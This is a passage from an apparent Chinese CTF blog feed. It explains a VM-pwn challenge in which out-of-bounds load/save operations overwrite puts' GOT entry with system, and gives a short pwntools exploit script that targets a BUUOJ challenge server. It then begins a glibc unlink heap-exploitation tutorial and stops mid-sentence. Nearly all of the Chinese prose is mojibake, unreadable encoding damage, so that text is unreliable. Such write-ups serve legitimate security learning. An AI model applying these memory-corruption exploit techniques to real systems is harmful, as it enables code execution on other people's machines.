/><p>ä¸Šé¢éœ€è¦æ³¨æ„çš„æ˜¯strtokå‡½æ•°ï¼Œstrtokå‡½æ•°ä¼šéå†delimä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœdelimä¸­æœ‰ä»»ä½•ä¸€ä¸ªå­—ç¬¦åœ¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­å‡ºç°ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšåˆ†éš”ç¬¦è¿›è¡Œåˆ†å‰²ï¼Œä½¿ç”¨è¿‡strtokå‡½æ•°ä¸€æ¬¡åï¼Œä¹‹åçš„æ¯æ¬¡å¾€ä¸‹åˆ†å‰²åªéœ€è¦è®©ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºNULLå³å¯ã€‚</p><h4 id="è·å–æ•°æ®çš„å‡½æ•°"><a href="#è·å–æ•°æ®çš„å‡½æ•°" class="headerlink" title="è·å–æ•°æ®çš„å‡½æ•°"></a>è·å–æ•°æ®çš„å‡½æ•°</h4><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052256437.png" alt="image-20221205225650366"></p><p>è¿™ä¸ªå‡½æ•°æ˜¯è·å–ç”¨æˆ·è¾“å…¥çš„æ¯ä¸ªæ•°æ®ï¼Œå°†å…¶å­˜å‚¨åˆ°dataæ®µä¸Šï¼Œä¹Ÿæ˜¯ä»¥delimåˆ†å‰²(è¿™ä¸ªdataæ®µæ˜¯å’Œtextæ®µä»¥åŠstackæ®µé…å¥—ä½¿ç”¨çš„)</p><h4 id="å¤„ç†æŒ‡ä»¤å‡½æ•°"><a href="#å¤„ç†æŒ‡ä»¤å‡½æ•°" class="headerlink" title="å¤„ç†æŒ‡ä»¤å‡½æ•°"></a>å¤„ç†æŒ‡ä»¤å‡½æ•°</h4><p>è¿™ä¸ªexecuteå‡½æ•°å¯ä»¥å¯¹ä¹‹å‰è¾“å…¥çš„æ¯ä¸ªæŒ‡ä»¤è¿›è¡Œå¤„ç†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸‹é¢çš„puts(s)ï¼Œå› ä¸ºså¯æ§ï¼Œå¹¶ä¸”ç¨‹åºå¯ä»¥è¢«ç¯¡æ”¹gotè¡¨ï¼Œæ‰€ä»¥ä¹‹åæœ‰æœºä¼šå¯ä»¥è€ƒè™‘å°†putsçš„gotè¡¨åŠ«æŒä¸ºsystemçš„åœ°å€ï¼Œä»è€Œåœ¨æ­¤å¤„è·å–shell</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052258349.png" alt="image-20221205225833308"></p><p>ç„¶åä¸‹é¢åˆ†æå‡ ä¸ªå…¸å‹çš„å‡½æ•°</p><p>ä¸‹é¢è¿™ä¸ªå‡½æ•°æ˜¯ä»a1é‡Œé¢è·å–ä¸€ä¸ªå€¼ï¼Œå­˜æ”¾åˆ°a2æŒ‡å‘çš„ä½ç½®ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052300547.png" alt="image-20221205230047501"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052303350.png" alt="image-20221205230302286"></p><p>ç»“åˆä¸Šå›¾æ¥è¯´ï¼Œ(getå‡½æ•°)å°±æ˜¯ä»ç¬¬ä¸€ä¸ªå‚æ•°ä¸­å–ä¸€ä¸ªæ•°æ®æ”¾ç½®åˆ°v6ä¸­ï¼Œä»è€Œè¯†åˆ«å‡ºä¸åŒæŒ‡ä»¤ã€‚</p><h5 id="pushå‡½æ•°"><a href="#pushå‡½æ•°" class="headerlink" title="pushå‡½æ•°"></a>pushå‡½æ•°</h5><p>æ¥ç€æ˜¯pushå‡½æ•°ï¼Œä»å‡½æ•°å¼•ç”¨è¿™é‡Œçœ‹å‡ºpushå‡½æ•°éœ€è¦ä¸€ä¸ªstackçš„åœ°å€å’Œdataåœ°å€(å¦‚ä¸‹)</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052306158.png" alt="image-20221205230636113"></p><p>è¿›å…¥å†…éƒ¨çš„è¯æ˜¯ä¾æ¬¡è°ƒç”¨äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œå‰è€…æ˜¯ä¸Šé¢åˆ†æè¿‡çš„getå‡½æ•°ï¼Œå°†dataæ®µé‡Œçš„ä¸€ä¸ªæ•°æ®å–å‡ºæ¥ç»™v3ï¼Œè€Œç¬¬äºŒä¸ªå‡½æ•°æ˜¯å°†v3çš„å€¼èµ‹å€¼ç»™stackï¼Œå…·ä½“å†…éƒ¨å®ç°çš„è¿‡ç¨‹å°±ä¸æ”¾äº†ï¼Œå› ä¸ºæˆ‘åˆ†æçš„ä¸æ˜¯ååˆ†é€å½»ï¼Œ<strong>æˆ‘ä¸»è¦æ˜¯é€šè¿‡åŠ¨æ€è°ƒè¯•è§‚å¯Ÿå‡½æ•°æ‰§è¡Œå‰å’Œæ‰§è¡Œåstack data textä»¥åŠå¯„å­˜å™¨é‡Œçš„å˜åŒ–å¾—å‡ºæ¥æ¯ä¸ªå‡½æ•°çš„ä½œç”¨</strong></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052307117.png" alt="image-20221205230703076"></p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><p>ç„¶åæ˜¯addå‡½æ•°ï¼Œå†…éƒ¨æ˜¯ç”¨äº†ä¸¤ä¸ªgetè¿ç»­ä»stacké‡Œé¢å–ä¸¤æ¬¡æ•°æ®ï¼Œç›¸åŠ åè¦†ç›–äº†ç¬¬ä¸€ä¸ªæ“ä½œæ•°å°†å…¶æ”¾å›ã€‚</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052309678.png" alt="image-20221205230944629"></p><h5 id="saveå‡½æ•°"><a href="#saveå‡½æ•°" class="headerlink" title="saveå‡½æ•°"></a>saveå‡½æ•°</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052311263.png" alt="image-20221205231132218"></p><p>å‘ç°å°±ä¸€ä¸ªå‚æ•°stack(æ³¨æ„è¿™ä¸ªstackæ˜¯æ§åˆ¶å †å—çš„åœ°å€ï¼Œè€Œæ§åˆ¶å †å—é‡Œå­˜æ”¾çš„åœ°å€æ‰æ˜¯çœŸæ­£æŒ‡å‘stackçš„)</p><p>å†…éƒ¨å®ç°å¦‚ä¸‹ï¼Œå…ˆæ˜¯ä»stacké‡Œå–äº†ä¸¤ä¸ªæ•°æ®ï¼Œçº¢æ¡†é‡Œæ‰æ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œç®€å•åˆ†æä¸€ä¸‹ï¼Œ*(stack+12)æ˜¯stackä¸­å­˜å‚¨å…ƒç´ çš„ä¸ªæ•°ï¼Œå†åŠ v2(å¯æ§)çš„å€¼ä¹˜ä»¥8åŠ ä¸Š*stack(*stackå°±æ˜¯çœŸæ­£stackçš„åœ°å€ï¼Œè€Œæœ¬æ¥çš„stackæ˜¯æ§åˆ¶å †å—çš„åœ°å€)å¾—åˆ°æœ€åçš„åœ°å€ï¼Œsaveå‡½æ•°å°±æ˜¯å°†v3çš„å€¼å†™å…¥æœ€åè¿™ä¸ªåœ°å€é‡Œã€‚</p><p>å¾ˆæ˜æ˜¾v2æ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨*stackåŠ ä¸Šä¸€ä¸ªå¯æ§åç§»æ¥å®ç°ä»»æ„æ•°æ®å†™å…¥</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052313057.png" alt="image-20221205231309007"></p><h5 id="loadå‡½æ•°"><a href="#loadå‡½æ•°" class="headerlink" title="loadå‡½æ•°"></a>loadå‡½æ•°</h5><p>loadå‡½æ•°ä¸saveå‡½æ•°ç›¸åï¼Œå®ƒçš„æ¼æ´æœ€åå¯ä»¥åˆ©ç”¨ä¸ºä»ä»»æ„åœ°å€è¯»å‡ºæ•°æ®æ”¾å…¥æ ˆä¸­(å¦‚ä¸‹)ï¼ŒåŒæ ·æ˜¯å› ä¸ºv2å¯æ§ï¼Œè¿™æ ·å¯ä»¥åˆ©ç”¨*stackåŠ ä¸Šå¯æ§åç§»å°†ä»»æ„åœ°å€(å‰ææ˜¯ä»»æ„åœ°å€å’Œ*stackå­˜åœ¨å›ºå®šåç§»)ä¸­çš„æ•°æ®è¯»å…¥åˆ°æ ˆä¸­</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052320237.png" alt="image-20221205232048187"></p><h3 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬è€ƒè™‘åŠ«æŒputsçš„gotè¡¨ä¸ºsystemåœ°å€ã€‚å…ˆå°†putsçš„åœ°å€ç”¨loadè¯»å…¥åˆ°stackä¸­å†ç”¨addå‡½æ•°åŠ ä¸Šä¸€å®šçš„åç§»å¾—åˆ°systemçš„åœ°å€ï¼Œå†åˆ©ç”¨saveå‡½æ•°å°†systemçš„åœ°å€å†™å…¥åˆ°putsçš„gotè¡¨ã€‚</p><p>è°ƒè¯•è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p>ä¸‹å›¾ä¸ºæ­£å¸¸æƒ…å†µä¸‹stackä¸å…¶æ§åˆ¶å †å—çš„å…³ç³»ï¼Œå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ§åˆ¶å †å—é‡Œå­˜æ”¾çš„æ˜¯stackçš„æŒ‡é’ˆï¼Œå¦‚æœæˆ‘ä»¬æƒ³å»ç¯¡æ”¹gotè¡¨ï¼Œç¬¬ä¸€ä»¶äº‹å°±æ˜¯è¦å°†è¿™ä¸ªåœ°å€ä¿®æ”¹æˆgotåœ°å€é™„ä»¶çš„åœ°å€ã€‚</p><blockquote><p>èƒ½å¦ç›´æ¥å°†æ§åˆ¶å †å—ä¸­å­˜æ”¾çš„åœ°å€ä¿®æ”¹ä¸ºputsçš„gotåœ°å€?</p><p>ä¸èƒ½ï¼Œå¦‚æœä¿®æ”¹åçš„è¯ï¼Œ*(stack+12)å°±ä¼šæ‹¿åˆ°ä¸€ä¸ªè¶…çº§å¤§çš„å€¼è¢«å½“åšç´¢å¼•(è€Œè¿™ä¸ªè¶…çº§å¤§çš„å€¼å®é™…ä¸Šæ˜¯å‡½æ•°çš„çœŸå®åœ°å€)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æ§åˆ¶å †å—ä¸­çš„åœ°å€å†³å®šäº†stackä½äºä½•å¤„ï¼Œå¦‚æœæ›´æ”¹ä¸ºputsçš„gotåœ°å€åï¼Œä¹‹åçš„pushæ“ä½œåˆ™ä¼šå¯¹å„ä¸ªå‡½æ•°çš„gotè¡¨è¿›è¡Œç ´åï¼Œå¹¶ä¸”*(stack+12)ä¹Ÿä¼šå› ä¸ºè¿‡å¤§å¯¼è‡´ç¨‹åºå´©æºƒ</p></blockquote><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052324075.png" alt="image-20221205232444875"></p><p>æ‰€ä»¥æˆ‘ä»¬å¾—å…ˆæŠŠstackè¿ç§»åˆ°gotè¡¨é™„è¿‘ï¼Œè¿™é‡Œæˆ‘è¿ç§»åˆ°äº†0x4040d0ï¼Œè¿™é‡Œæ­£å¥½ä½äºäº†gotè¡¨çš„ä¸‹æ–¹(å¦‚ä¸‹å›¾)ï¼Œå¹¶ä¸”è¿™ä¸ªåœ°æ–¹æ­£å¥½éƒ½æ˜¯å†…å­˜ä¸º0ï¼Œå½“åšä¸€ä¸ªæ–°çš„stackå†å¥½ä¸è¿‡ã€‚</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052330226.png" alt="image-20221205233023770" style="zoom:50%;" /><p>æ­¤æ—¶æ–°çš„stackä½äºgotè¡¨ä¸‹æ–¹ï¼Œæˆ‘ä»¬pushè¿›æ¥æ–°çš„ç´¢å¼•ï¼Œè®©å…¶ä¸ºè´Ÿæ•°ï¼Œè¿™æ ·å°±èƒ½é€šè¿‡æ–°çš„stackè®¿é—®åˆ°gotè¡¨ä¸­çš„æ•°æ®ï¼Œå°†å…¶å†™åˆ°æ–°çš„stack</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052332630.png" alt="image-20221205233223457"></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052333469.png" alt="image-20221205233335216"></p><p>æœ€åæ‰§è¡Œä¸€æ¬¡saveå‡½æ•°å°†systemçš„åœ°å€å†™å›putsçš„gotè¡¨å³å¯</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;node4.buuoj.cn:25001&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your program name:\n&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4019E2</span>,<span class="number">0x401A75</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your instruction:\n&quot;</span>,<span class="string">&quot;push push save push load push add push save&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your stack data:\n&quot;</span>,<span class="string">&quot;4210896 -3 -21 -172800 -21&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212052338726.png" alt="image-20221205233853481"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.anquanke.com/post/id/208450#h2-0">VM Pwnå­¦ä¹ -å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://blog.csdn.net/A951860555/article/details/117214601">(44æ¡æ¶ˆæ¯) OGeek_2019_Final OVMé¢˜è§£___lifanxinçš„åšå®¢-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ æ€»ç»“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vm pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºunlinkçš„å­¦ä¹ æ€»ç»“</title>
      <link href="/posts/afa5cfa3.html"/>
      <url>/posts/afa5cfa3.html</url>
      
        <content type="html"><![CDATA[<p>å…³äºunlinkçš„å­¦ä¹ æ€»ç»“ï¼Œ<strong>æˆ‘æ‰“ç®—åˆ†æˆ4ä¸ªéƒ¨åˆ†æ¥è¯´æ˜ï¼Œåˆ†åˆ«æ˜¯unlinkçš„åˆ©ç”¨æ•´ä½“æ€è·¯ã€å¦‚ä½•ä¼ªé€ fake_chunkã€æ¢ç©¶ä¸‹unlinkæ¼æ´æ˜¯å¦‚ä½•å®ç°çš„ã€ç›¸å…³é¢˜ç›®çš„WP</strong>ã€‚æˆ‘è¿™ç¯‡åšå®¢å¹¶æ²¡æœ‰ç”»å›¾ç‰‡æ¥è¯´æ˜unlinkçš„æ“ä½œï¼Œæˆ‘è®¤ä¸ºä¸æ˜¯ç‰¹åˆ«é€‚åˆå®Œå…¨ä¸æ‡‚unlinkçš„å¸ˆå‚…æ¥å‚è€ƒå­¦ä¹ ï¼Œå»ºè®®å»çœ‹ä¸€äº›å…¶ä»–å¸ˆå‚…ä¸€äº›ç”»å›¾è¯´æ˜unlinkçš„åšå®¢ï¼Œå¯¹unlinkæœ‰ä¸ªæ¨¡ç³Šçš„è®¤è¯†åï¼Œå†çœ‹è¿™ç¯‡æ–‡ç« åº”è¯¥æ•ˆæœæœ€å¥½</p><h2 id="å¯¹unlinkçš„æ€»ç»“ï¼š"><a href="#å¯¹unlinkçš„æ€»ç»“ï¼š" class="headerlink" title="å¯¹unlinkçš„æ€»ç»“ï¼š"></a>å¯¹unlinkçš„æ€»ç»“ï¼š</h2><p>1ã€unlinkçš„æ•´ä½“åˆ©ç”¨æ€è·¯ä¸º</p><p>â‘ ã€åˆ©ç”¨æº¢å‡ºä¼ªé€ fake_chunk</p><p>â‘¡ã€freeæ‰å¼•çº¿å †å—ï¼ˆä¹Ÿå°±æ˜¯è¢«æº¢å‡ºä¿®æ”¹prev_sizeå’Œsizeçš„chunkï¼‰ï¼Œä»è€Œè§¦å‘unlinkï¼ˆæ³¨æ„chunkåˆ«è·Ÿtop chunkåˆå¹¶äº†ï¼‰ï¼ŒåŒæ—¶å¼•çº¿å †å—çš„å¤§å°ä¸€å®šè¦å¤§äºç­‰äº0x80ï¼Œé¿å…è¢«freeæ‰ç»™æ”¾è¿›äº†fastbinä¸­ã€‚</p><p>â‘¢ã€æœ€åæ•ˆæœä¸ºfake_chunkçš„åœ°å€æ”¹ä¸º&amp;P-0x18 </p><p>â‘£ã€é€šè¿‡editåŠŸèƒ½ä¿®æ”¹bssæ®µå­˜æ”¾çš„chunkä¿¡æ¯ï¼Œè¿›è¡Œæ³„éœ²å‡½æ•°çœŸå®åœ°å€ä»¥åŠç¯¡æ”¹å‡½æ•°çš„gotè¡¨ï¼Œä»è€Œè·å–shellã€‚</p><p>2ã€fake_chunkæœªå¿…éè¦å’Œå¼•çº¿å †å—ç›¸é‚»ï¼Œåªè¦è®©å¼•çº¿å †å—çš„åœ°å€å‡å»è‡ªèº«çš„prev_sizeå¯ä»¥æ‰¾åˆ°fake_chunkå³å¯</p><blockquote><p>ä»€ä¹ˆæ—¶å€™è€ƒè™‘unlinkï¼Ÿ ç›®å‰ä»¥æˆ‘åšé¢˜çš„æƒ…å†µæ¥çœ‹ï¼Œé€šå¸¸ä¸å¼€PIEï¼Œå¹¶ä¸”å­˜åœ¨å †æº¢å‡ºçš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥è€ƒè™‘unlinkçš„ã€‚</p></blockquote><h2 id="æ„é€ fake-chunk"><a href="#æ„é€ fake-chunk" class="headerlink" title="æ„é€ fake_chunk"></a>æ„é€ fake_chunk</h2><p>åˆ©ç”¨unlinkä¹‹å‰ï¼Œè¦æ„é€ å¥½fake_chunkï¼ˆè¿™ä¸ªchunkå¹¶ä¸æ˜¯ç”³è¯·å‡ºæ¥çš„ï¼Œè€Œæ˜¯å†™å…¥ç²¾å¿ƒæ„é€ çš„æ•°æ®ä¼ªé€ çš„chunkï¼‰ä¸ºä¹‹åçš„unlinkåšé“ºå«ï¼Œè¿™ä¸ªfake_chunkæœ‰ä¸‰ä¸ªå…³é”®éƒ¨åˆ†ã€‚</p><p>ç¬¬ä¸€ã€fake_chunkéœ€è¦ä¼ªé€ è‡ªå·±çš„prev_sizeå’Œsizeï¼ˆè¿™ä¸ªprev_sizeå¡«å……æˆ0å³å¯ï¼‰ï¼Œsizeä½æœ€å°ä¸º0x20ï¼ˆå› ä¸ºè¦è£…fdå’Œbkè¿˜è¦æº¢å‡ºä¸‹ä¸ªchunkçš„prev_sizeå’Œsizeï¼‰åŒæ—¶sizeéœ€è¦ä¸ä¸‹ä¸€ä¸ªchunkçš„prev_sizeä½ä¿æŒä¸€è‡´ï¼ˆPREV_INUSEä½æœ€å¥½ä¸º1)ã€‚</p><p>ç¬¬äºŒã€fake_chunk(è¿™ä¸ªfake_chunkè¦æ„é€ æˆé‡Šæ”¾çŠ¶æ€çš„,è¿™æ ·fdå’Œbkæ‰æœ‰æ„ä¹‰)çš„fdå’Œbkè®¾ç½®æˆ&amp;fake_chunk-0x18å’Œ&amp;fake_chunk-0x10ã€‚ï¼ˆè¿™é‡ŒæŒ‡çš„&amp;fake_chunk,å°±æ˜¯bssæ®µä¸Šå­˜æ”¾chunkçš„åœ°å€ï¼‰</p><p>ç¬¬ä¸‰ã€è¦å°†ä¸‹ä¸€ä¸ªchunk(ç›¸å½“äºå†™å…¥æ•°æ®çš„chunkæ¥è¯´ï¼Œæˆ‘ä¹ æƒ¯å°†é«˜åœ°å€çš„chunkç§°ä¸ºä¸‹)çš„prev_sizeå’Œsizeè¿›è¡Œæº¢å‡ºä¿®æ”¹ï¼Œprev_sizeè¦ä¿®æ”¹ä¸ºfake_chunkçš„å¤§å°ï¼ˆå¦‚æœfake_chunkæ²¡æœ‰å’Œä¸‹ä¸€ä¸ªchunkç›¸é‚»ï¼Œé‚£ä¹ˆéœ€è¦ä¿è¯ä¸‹ä¸€ä¸ªchunkçš„åœ°å€å‡å»prev_sizeçš„å€¼ï¼Œæ­£å¥½å¯ä»¥æ‰¾åˆ°fake_chunkï¼‰ï¼Œè€Œsizeå°±æ˜¯å†™æˆåŸæœ¬è¿™ä¸ªchunkçš„å¤§å°ï¼Œä½†æ˜¯PREV_INUSEä½è¦æ”¹å†™æˆ0ï¼ˆç”¨æ¥å£°æ˜ä¸Šä¸€ä¸ªå †å—æ˜¯freeçŠ¶æ€ï¼‰ã€‚</p><p>ç„¶åfreeæ‰é«˜åœ°å€çš„chunkï¼Œæ­¤æ—¶ç¨‹åºæ£€æµ‹åˆ°äº†è¿™ä¸ªå †å—çš„PREV_INUSEä¸º0ï¼Œå°±ä¼šè®¤ä¸ºä¸Šä¸€ä¸ªå †å—å¤„äºfreeçŠ¶æ€ï¼Œç„¶åå°±ä¼šè§¦å‘unlinkå°†é«˜åœ°å€çš„chunkå’Œä¸Šä¸€ä¸ªchunkåˆå¹¶ï¼Œ<strong>å®ƒæ€ä¹ˆå»æ‰¾åˆ°ä¸Šä¸€ä¸ªchunkçš„èµ·å§‹ä½ç½®å‘¢ï¼Ÿå®ƒä¼šç”¨å½“å‰chunkçš„åœ°å€å‡å»prev_sizeçš„å¤§å°æ‰¾åˆ°ä¸Šä¸€ä¸ªchunkçš„ä½ç½®ï¼Œä½†æ˜¯prev_sizeå·²ç»è¢«ä¿®æ”¹æˆäº†fake_sizeçš„å¤§å°ï¼Œå› æ­¤å½“å‰chunkçš„åœ°å€å‡å»prev_sizeå¤§å°è¯¯æŠŠfake_chunkå½“åšäº†ä¸Šä¸€ä¸ªchunk</strong>ï¼Œç„¶åè¿›è¡Œunlinkæ“ä½œã€‚</p><h2 id="æ¢ç©¶unlinkæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„"><a href="#æ¢ç©¶unlinkæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„" class="headerlink" title="æ¢ç©¶unlinkæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„"></a>æ¢ç©¶unlinkæ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„</h2><p>ä¸‹é¢æ˜¯unlinkçš„æºç ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸‹é¢æ˜¯å°†æºç çš„å…³é”®éƒ¨åˆ†æå–å‡ºæ¥äº†</p><p>unlinkå®çš„å‚æ•°</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br></pre></td></tr></table></figure><p>unlinkä¸­ä¸Šæ¥ç›´æ¥æ‰§è¡Œçš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD = P-&gt;fd;      </span><br><span class="line">BK = P-&gt;bk;</span><br></pre></td></tr></table></figure><p>ifè¦æ£€æŸ¥ï¼ˆæ»¡è¶³ä¸‹é¢çš„æ¡ä»¶ï¼Œåˆ™å¯ä»¥é€šè¿‡ifï¼‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk == P || BK-&gt;fd == P</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ£€æŸ¥åï¼Œæ‰§è¡Œçš„ä»£ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk = BK;      </span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure><blockquote><p>ç¨‹åºæ˜¯æ€ä¹ˆæ‰¾åˆ°fdå’ŒbkæŒ‡é’ˆçš„ï¼Ÿ ç­”ï¼šé åç§»ï¼Œè€Œè¿™å°±ç»™äº†æˆ‘ä»¬ä¼ªé€ fdå’Œbkçš„æœºä¼š</p></blockquote><p>ä»¥ <code>FD-&gt;bk ==P</code>ä¸ºä¾‹(64ä½ç¨‹åºï¼‰ï¼Œå®ƒå°±ç­‰ä»·äº*(FD+0x18)&#x3D;&#x3D;P  (<strong>è¯·æ³¨æ„è¿™é‡Œæ˜¯å­˜åœ¨*()çš„ï¼Œè¿™é‡Œä¸æ˜ç™½çš„å¯ä»¥å»å­¦ä¹ ä¸€ä¸‹Cè¯­è¨€çš„æŒ‡é’ˆ</strong>) (0x18æ˜¯å› ä¸ºbkæŒ‡é’ˆè·ç¦»å †å—çš„èµ·å§‹åœ°å€æœ‰ä¸‰ä¸ªå†…å­˜å•å…ƒå¤§å°çš„åç§»ï¼Œ64ä½ç¨‹åºä¸­å†…å­˜å•å…ƒçš„å¤§å°ä¸º0x8)</p><blockquote><p>å› ä¸ºFD&#x3D;P-&gt;fdï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡ºæ¥æ§åˆ¶P-&gt;fdï¼Œå°±æ„å‘³ç€æˆ‘ä»¬æ§åˆ¶äº†FDçš„å€¼ï¼Œè€ƒè™‘ä¸€ä¸‹FDçš„å€¼åº”è¯¥æ˜¯ä»€ä¹ˆï¼Œæ‰èƒ½æ»¡è¶³è¿™ä¸ªç­‰å¼<code>*(FD+0x18)==P</code> </p><p>ç­”æ¡ˆæ˜¯ FDåº”è¯¥ä¸º <code>&amp;P-0x18</code> æ‰èƒ½æ»¡è¶³ä¸Šè¿°ç­‰å¼ï¼Œä»£æ¢è¿›å»çš„å¼å­å°±æ˜¯è¿™ä¸ª   *(&amp;P+0x18-0x18)&#x3D;&#x3D;P  ï¼Œå› 